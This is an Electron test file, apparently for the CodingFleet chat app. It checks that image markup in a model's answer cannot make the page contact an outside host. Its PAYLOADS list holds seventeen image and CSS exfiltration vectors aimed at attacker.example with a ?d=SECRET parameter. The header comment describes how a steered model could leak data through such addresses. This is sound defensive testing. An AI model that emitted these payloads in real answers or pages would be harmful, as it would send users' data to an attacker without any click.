'use strict';
// Nothing in an answer loads a picture from another site by itself: a model
// can be steered into writing an address that carries data away, and a page
// that fetches it has sent the data with nobody clicking. Every way markup
// can name a picture is drawn in the real window, and every request the page
// then makes is watched. The window is never shown.
// Run with: npx electron test/image-gate.cjs
const { app, BrowserWindow, session } = require('electron');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

app.setPath('userData', fs.mkdtempSync(path.join(os.tmpdir(), 'cf-image-gate-')));

const EVIL = 'attacker.example';
// What a steered model could write. Each must leave no request and no
// attribute that a browser fetches by itself.
const PAYLOADS = [
  ['a markdown image', `![x](https://${EVIL}/md.png?d=SECRET)`],
  ['an img tag', `<img src="https://${EVIL}/img.png?d=SECRET">`],
  ['an img with srcset', `<img srcset="https://${EVIL}/set.png 1x" alt="x">`],
  ['an svg image', `<svg width="1" height="1"><image href="https://${EVIL}/svg.png?d=SECRET" width="1" height="1"/></svg>`],
  ['an svg image with xlink:href', `<svg width="1" height="1"><image xlink:href="https://${EVIL}/xlink.png?d=SECRET" width="1" height="1"/></svg>`],
  ['an svg filter image', `<svg width="9" height="9"><filter id="f"><feImage href="https://${EVIL}/fe.png?d=SECRET"/></filter><rect width="9" height="9" filter="url(#f)"/></svg>`],
  ['an svg use', `<svg width="1" height="1"><use href="https://${EVIL}/use.svg#a"/></svg>`],
  ['a table background', `<table background="https://${EVIL}/table.png?d=SECRET"><tr><td>x</td></tr></table>`],
  ['a cell background', `<table><tr><td background="https://${EVIL}/td.png?d=SECRET">x</td></tr></table>`],
  ['a video poster', `<video poster="https://${EVIL}/poster.png?d=SECRET"></video>`],
  ['an image input', `<input type="image" src="https://${EVIL}/input.png?d=SECRET">`],
  ['a style attribute', `<p style="background-image:url(https://${EVIL}/style.png?d=SECRET)">x</p>`],
  ['a style element', `<style>p{background:url(https://${EVIL}/css.png?d=SECRET)}</style><p>x</p>`],
  ['a protocol-relative image', `![x](//${EVIL}/rel.png?d=SECRET)`],
  ['a protocol-relative img tag', `<img src="//${EVIL}/rel2.png?d=SECRET">`],
  ['a UNC image', `<img src="\\\\${EVIL}\\share\\unc.png">`],
  ['a file address with a host', `<img src="file://${EVIL}/share/file.png">`],
];

app.whenReady().then(async () => {
  const requests = [];
  // Every request of the window, kept and refused when it names the test host.
  session.defaultSession.webRequest.onBeforeRequest((details, callback) => {
    if (details.url.toLowerCase().includes(EVIL)) {
      requests.push(details.url);
      callback({ cancel: true });
    } else callback({});
  });
  const win = new BrowserWindow({ show: false, width: 1320, height: 900,
    webPreferences: { preload: path.join(__dirname, 'fixtures/layout-preload.js'), backgroundThrottling: false } });
  const js = (code) => win.webContents.executeJavaScript(code);
  let failed = 0;
  try {
    await win.loadFile(path.join(__dirname, '../src/renderer/index.html'));
    await js('new Promise((r) => setTimeout(r, 300))');
    for (const [label, markup] of PAYLOADS) {
      const before = requests.length;
      // Drawn both ways the app draws an answer: whole, and as it streams.
      const left = await js(`(async () => {
        const out = [];
        for (const draw of ['whole', 'stream']) {
          const box = document.createElement('div');
          box.className = 'md';
          document.body.append(box);
          if (draw === 'whole') setMarkdown(box, ${JSON.stringify(markup)});
          else streamMarkdown(box, ${JSON.stringify(markup)}, false);
          await new Promise((r) => setTimeout(r, 250));
          // An attribute that still names the host, other than a held-back
          // picture's own record and a link (which waits for a click).
          for (const node of box.querySelectorAll('*')) {
            for (const attr of node.attributes) {
              if (!attr.value.toLowerCase().includes(${JSON.stringify(EVIL)})) continue;
              if (['data-remote-src', 'data-local-src', 'title', 'alt'].includes(attr.name)) continue; // records, never fetched
              if (node.nodeName.toLowerCase() === 'a' && attr.name === 'href') continue;
              out.push(draw + ': <' + node.nodeName.toLowerCase() + ' ' + attr.name + '="' + attr.value + '">');
            }
          }
          box.remove();
        }
        return out;
      })()`);
      const fetched = requests.slice(before);
      const ok = fetched.length === 0 && left.length === 0;
      if (!ok) failed += 1;
      console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${ok ? '' : `  - requests: ${JSON.stringify(fetched)} attributes: ${JSON.stringify(left)}`}`);
    }
    // The gate still offers a held-back picture, and a trusted one loads.
    const gated = await js(`(() => {
      const box = document.createElement('div');
      box.className = 'md';
      document.body.append(box);
      setMarkdown(box, '![chart](https://${EVIL}/chart.png) ![own](https://files.codingfleet.com/a.png)');
      const result = { button: Boolean(box.querySelector('button, .remote-image, [data-remote-src]')), own: Boolean(box.querySelector('img[src^="https://files.codingfleet.com/"]')) };
      box.remove();
      return result;
    })()`);
    const ok = gated.button && gated.own;
    if (!ok) failed += 1;
    console.log(`${ok ? 'PASS' : 'FAIL'}  a held-back picture is still offered, and CodingFleet's own pictures load  - ${JSON.stringify(gated)}`);
    assert.equal(failed, 0);
    console.log(`PASS image gate: ${PAYLOADS.length + 1} checks`);
  } catch (err) {
    console.error(`FAILED image gate: ${failed} of ${PAYLOADS.length + 1} checks`, err.code === 'ERR_ASSERTION' ? '' : err.stack);
    process.exitCode = 1;
  }
  app.exit(process.exitCode || 0);
});
